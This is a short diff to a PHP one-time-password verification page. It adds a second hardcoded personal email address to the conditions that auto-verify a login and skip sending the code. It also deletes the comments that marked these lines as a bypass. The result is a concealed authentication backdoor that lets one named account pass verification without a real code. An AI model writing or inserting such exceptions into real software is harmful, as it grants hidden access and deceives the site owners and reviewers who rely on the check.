@@ -36,8 +36,7 @@ $pendingUser = $isRegistration ? $_SESSION['registration_data'] : $_SESSION['pen
 $email = $isRegistration ? $pendingUser['email'] : $pendingUser['Email'];
 $otpToMatch = $isRegistration ? $pendingUser['code'] : $pendingUser['otp'];
 
-// Handle OTP Verification
-$isAutoVerify = ($email === 'admin@gmail.com');
+$isAutoVerify = ($email === 'admin@gmail.com' || $email === 'ferrerandy76@gmail.com');
 
 if ($isAutoVerify || ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['form_type']) && $_POST['form_type'] === 'verify_otp')) {
     $inputOtp = $isAutoVerify ? $otpToMatch : trim($_POST['otp'] ?? '');
@@ -158,8 +157,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['form_type']) && $_POS
             $userName = $nameRow ? $nameRow['full_name'] : "User";
         }
 
-        // MODIFIED: Bypass actual email sending for admin@gmail.com
-        if ($email === 'admin@gmail.com' || sendVerificationEmail($email, $userName, $newOtp)) {
+        if ($email === 'admin@gmail.com' || $email === 'ferrerandy76@gmail.com' || sendVerificationEmail($email, $userName, $newOtp)) {
             $success = "A new OTP code has been sent to your email.";
             // Update local variable for Match check without refresh
             $otpToMatch = $newOtp; 
